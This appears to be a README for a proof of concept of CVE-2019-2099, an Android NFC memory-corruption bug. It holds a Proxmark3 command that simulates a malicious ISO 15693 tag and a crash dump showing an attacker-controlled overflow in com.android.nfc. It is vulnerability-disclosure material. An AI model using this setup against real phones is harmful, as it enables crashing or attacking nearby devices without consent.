# CVE-2019-2099

> Note this PoC contains code from Proxmark3, please comply to its license.

A PoC for vulnerability related to NFC. Just replace the same file of Proxmark3(<https://github.com/Proxmark/proxmark3>) in armsrc folder, and run Proxmark3 to simulate an ISO 15693 card with this command:

`hf 15 sim E016240000000000`

Part of crash dump:

```
Build fingerprint: 'Android/aosp_walleye/walleye:9/PQ1A.190105.004/hyrathon01111717:userdebug/test-keys'
Revision: 'MP1'
ABI: 'arm64'
pid: 1895, tid: 2060, name: Thread-5  >>> com.android.nfc <<<
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x723ce00000
    x0  000000723cdfff6c  x1  6666666666666666  x2  6666666666666666  x3  000000723cdfffe0
    x4  000000722d3d4da2  x5  000000723ce00060  x6  6666666666666666  x7  6666666666666666
    x8  6666666666666666  x9  6666666666666666  x10 6666666666666666  x11 6666666666666666
    x12 6666666666666666  x13 6666666666666666  x14 00000020afc58497  x15 0002685ba48c93ad
    x16 000000722d3c7240  x17 00000072c7688bc0  x18 000000000042ced8  x19 000000722d387f0c
    x20 000000722ccc0520  x21 000000722ccc13a0  x22 000000722ccc31a0  x23 0000000000000000
    x24 000000722ccc3570  x25 000000722cbc6000  x26 000000722cdc1588  x27 000000722d388924
    x28 0000000000000000  x29 000000722ccc06d0
    sp  000000722ccc0520  lr  000000722d300eb0  pc  00000072c765ecb4

backtrace:
    #00 pc 000000000001dcb4  /system/lib64/libc.so (memcpy+324)
    #01 pc 0000000000077eac  /system/lib64/libnfc-nci.so (nfa_rw_store_ndef_rx_buf(tRW_DATA*) [clone .cfi]+148)
    #02 pc 00000000000775f4  /system/lib64/libnfc-nci.so (nfa_rw_handle_i93_evt(unsigned char, tRW_DATA*) [clone .cfi]+116)
    #03 pc 000000000007497c  /system/lib64/libnfc-nci.so (nfa_rw_cback(unsigned char, tRW_DATA*) [clone .cfi]+388)
    #04 pc 00000000000b78c4  /system/lib64/libnfc-nci.so (rw_i93_sm_read_ndef(NFC_HDR*) [clone .cfi]+1404)
    #05 pc 00000000000ba48c  /system/lib64/libnfc-nci.so (rw_i93_data_cback(unsigned char, unsigned short, tNFC_CONN*) [clone .cfi]+1476)
    #06 pc 00000000000a3118  /system/lib64/libnfc-nci.so (nfc_data_event(tNFC_CONN_CB*) [clone .cfi]+872)
    #07 pc 00000000000a2d70  /system/lib64/libnfc-nci.so (nfc_ncif_proc_data(NFC_HDR*) [clone .cfi]+1664)
    #08 pc 00000000000a1e08  /system/lib64/libnfc-nci.so (nfc_ncif_process_event(NFC_HDR*) [clone .cfi]+488)
    #09 pc 00000000000a7960  /system/lib64/libnfc-nci.so (nfc_task(unsigned int) [clone .cfi]+640)
    #10 pc 00000000000f8e90  /system/lib64/libnfc-nci.so (gki_task_entry(void*) [clone .cfi]+440)
    #11 pc 0000000000083194  /system/lib64/libc.so (__pthread_start(void*)+36)
    #12 pc 00000000000233bc  /system/lib64/libc.so (__start_thread+68)

stack:
         000000722ccc04a0  000000722ccc0510  <anonymous:000000722cbc8000>
         000000722ccc04a8  00000072c76e1ddc  /system/lib64/libc.so (je_free+124)
         000000722ccc04b0  000000722ccc0560  <anonymous:000000722cbc8000>
         000000722ccc04b8  0000007246a221a0  [anon:libc_malloc]
         000000722ccc04c0  000000722ccc0560  <anonymous:000000722cbc8000>
         000000722ccc04c8  06ba77e163742c9f
         000000722ccc04d0  0000000000000000
         000000722ccc04d8  000000722cbc6000  [anon:thread stack guard]
         000000722ccc04e0  000000722ccc3570  <anonymous:000000722cbc8000>
         000000722ccc04e8  06ba77e163742c9f
         000000722ccc04f0  0000000000000000
         000000722ccc04f8  000000722ccc13a0  <anonymous:000000722cbc8000>
         000000722ccc0500  000000722ccc0520  <anonymous:000000722cbc8000>
         000000722ccc0508  000000722ccc0588  <anonymous:000000722cbc8000>
         000000722ccc0510  000000722ccc06d0  <anonymous:000000722cbc8000>
         000000722ccc0518  06ba77e163742c9f
    #00  000000722ccc0520  06ba77e163742c9f
         ........  ........
    #01  000000722ccc0520  06ba77e163742c9f
         ........  ........
    #02  000000722ccc06e0  0000000000000000
         ........  ........
    #03  000000722ccc0a90  0000000000000000
         ........  ........
    #04  000000722ccc0d80  000000722cdc1588  <anonymous:000000722ccc6000>
         ........  ........
    #05  000000722ccc1310  0000007246bf2c58  [anon:libc_malloc]
         ........  ........
    #06  000000722ccc1bb0  000000722ccc3588  <anonymous:000000722cbc8000>
         ........  ........
    #07  000000722ccc1d80  0000000000000008
         ........  ........
    #08  000000722ccc2260  000000722ccc3570  <anonymous:000000722cbc8000>
         ........  ........
    #09  000000722ccc2c00  06ba77e163742c9f
         ........  ........
    #10  000000722ccc31a0  06ba77e163742c9f
         ........  ........
    #11  000000722ccc34a0  00000072c76c4170  /system/lib64/libc.so (_ZL15__pthread_startPv)
         ........  ........
    #12  000000722ccc34c0  000000722cdc14f0  <anonymous:000000722ccc6000>
         000000722ccc34c8  0000000000000000
         000000722ccc34d0  000000722cdc1588  <anonymous:000000722ccc6000>
         000000722ccc34d8  000000722cdc1598  <anonymous:000000722ccc6000>
         000000722ccc34e0  0000000000000000
         000000722ccc34e8  0000000000000000
         000000722ccc34f0  000000722cebf4f0  <anonymous:000000722cdc3000>
         000000722ccc34f8  000000722cdc14f0  <anonymous:000000722ccc6000>
         000000722ccc3500  00000000ffffffff
         000000722ccc3508  ffffffff00000001
         000000722ccc3510  000000722cbc6000  [anon:thread stack guard]
         000000722ccc3518  00000000000fd4f0
         000000722ccc3520  0000000000001000
         000000722ccc3528  0000000000000000
         000000722ccc3530  000000722cdc1108  <anonymous:000000722ccc6000>
         000000722ccc3538  000000722cdc0e30  <anonymous:000000722ccc6000>
```

